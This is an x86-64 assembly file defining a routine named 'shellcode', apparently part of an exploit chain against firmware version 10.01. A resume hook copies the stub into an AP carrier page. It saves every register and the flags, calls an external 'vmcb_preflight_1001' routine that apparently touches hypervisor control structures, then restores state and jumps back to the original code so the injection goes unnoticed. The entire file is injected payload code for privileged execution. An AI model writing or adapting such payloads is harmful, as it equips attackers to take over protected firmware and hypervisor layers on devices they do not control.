.intel_syntax noprefix
.section .text.entry,"ax",@progbits
.global shellcode
.type shellcode, @function

/*
 * Firmware 10.01 root-0 preflight wrapper.
 *
 * The resume hook fills the parameter block after copying this image to the
 * low AP carrier page.  Preserve the incoming RSP, RFLAGS, and every GPR on a
 * private carrier stack.  The exact stock continuation is captured live from
 * RSI by the hook; no static continuation offset is trusted here.
 */
.set PARAM_STOCK_RIP,    0xf00
.set PARAM_EXEC_MARKER,  0xf28
.set PARAM_ORIGINAL_RSP, 0xf30
.set PRIVATE_STACK_TOP,  0xe00
.set AP_EXEC_MARKER,     0x4d505841

.set carrier_params,       shellcode + PARAM_STOCK_RIP
.set carrier_stock_rip,    shellcode + PARAM_STOCK_RIP
.set carrier_exec_marker,  shellcode + PARAM_EXEC_MARKER
.set carrier_original_rsp, shellcode + PARAM_ORIGINAL_RSP
.set carrier_stack_top,    shellcode + PRIVATE_STACK_TOP

shellcode:
    mov qword ptr [rip + carrier_original_rsp], rsp
    lea rsp, [rip + carrier_stack_top]

    pushfq
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

    cld
    mov qword ptr [rip + carrier_exec_marker], AP_EXEC_MARKER
    mfence
    lea rdi, [rip + carrier_params]
    call vmcb_preflight_1001

    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    popfq

    mov rsp, qword ptr [rip + carrier_original_rsp]
    jmp qword ptr [rip + carrier_stock_rip]
.size shellcode, .-shellcode
